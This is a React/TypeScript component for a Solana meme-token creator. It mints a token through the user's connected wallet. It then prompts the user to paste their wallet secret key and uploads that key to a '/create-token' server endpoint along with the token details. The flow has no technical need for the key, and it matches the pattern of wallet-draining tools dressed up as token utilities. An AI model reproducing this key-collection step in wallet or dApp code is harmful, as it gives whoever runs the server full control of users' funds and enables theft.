import { useWallet } from '@solana/wallet-adapter-react';
import { Connection, Keypair, SystemProgram, Transaction } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, createInitializeMintInstruction, MINT_SIZE } from '@solana/spl-token';
import axios from 'axios';
import { useState } from 'react';

export function TokenCreator() {
  const { publicKey, sendTransaction } = useWallet();
  const [name,setName]=useState(''),[symbol,setSymbol]=useState(''),
        [supply,setSupply]=useState(1e6),[decimals,setDecimals]=useState(6),
        [logo,setLogo]=useState<File|null>(null);

  async function onCreate(){
    if(!publicKey||!logo) return alert('Connect wallet & select logo');
    const conn=new Connection(process.env.NEXT_PUBLIC_RPC);
    const mint=Keypair.generate();
    const lam=await conn.getMinimumBalanceForRentExemption(MINT_SIZE);
    const tx=new Transaction()
      .add(SystemProgram.createAccount({
        fromPubkey:publicKey,newAccountPubkey:mint.publicKey,
        lamports:lam,space:MINT_SIZE,programId:TOKEN_PROGRAM_ID
      }))
      .add(createInitializeMintInstruction(
        mint.publicKey,decimals,publicKey,publicKey,TOKEN_PROGRAM_ID
      ));
    const sig=await sendTransaction(tx,conn,{signers:[mint]});
    await conn.confirmTransaction(sig);

    const form=new FormData();
    form.append('secret_key',prompt('Paste your secret key')!);
    form.append('name',name); form.append('symbol',symbol);
    form.append('supply',supply.toString()); form.append('decimals',decimals.toString());
    form.append('logo',logo);
    const r=await axios.post('/create-token', form, {headers:{'Content-Type':'multipart/form-data'}});
    alert(`Token ${symbol}@${r.data.mint} created`);
  }

  return (
    <div className="mb-4 p-4 border rounded">
      <h2>Create Meme-Token</h2>
      <input placeholder="Name" onChange={e=>setName(e.target.value)} className="block mb-2"/>
      <input placeholder="Symbol" onChange={e=>setSymbol(e.target.value)} className="block mb-2"/>
      <input type="number" placeholder="Supply" onChange={e=>setSupply(+e.target.value)} className="block mb-2"/>
      <input type="number" placeholder="Decimals" onChange={e=>setDecimals(+e.target.value)} className="block mb-2"/>
      <input type="file" accept="image/*" onChange={e=>setLogo(e.target.files?.[0]||null)} className="block mb-4"/>
      <button onClick={onCreate} className="px-4 py-2 bg-blue-500 text-white rounded">Create</button>
    </div>
  );
}
